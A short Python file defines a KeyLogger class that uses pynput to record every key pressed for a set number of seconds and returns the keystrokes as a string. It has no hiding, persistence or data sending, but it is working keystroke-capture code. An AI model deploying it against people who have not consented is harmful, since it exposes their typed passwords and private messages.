from pynput.keyboard import KeyCode, Listener, Key
import time

class KeyLogger:
    def __init__(self):
        self.keys = ''
        self.listener = None
        pass

    def on_press(self, key):
        if type(key) == Key:
            if key == Key.space:
                self.keys += ' '
            elif key == Key.enter:
                self.keys += '\n'
            elif key == Key.tab:
                self.keys += '\t'
            else:
                self.keys += '<' + str(key) + '>'
        else:

            if key.char == None:
                if 96 <= key.vk <= 105:
                    self.keys += "<numpad:" + chr(key.vk - 48) + ">"
                else:
                    self.keys += chr(key.vk)
            else:
                if ord(key.char) < 32: 
                    self.keys += chr(key.vk)
                else:
                    self.keys += key.char
    
    def hook_in(self, Xtime): 
        self.listener = Listener(on_press = self.on_press)
        self.listener.start()
        time.sleep(Xtime)
        self.listener.stop()
        return self.keys
# 
# abc = KeyLogger()
# print(abc.hook_in(5))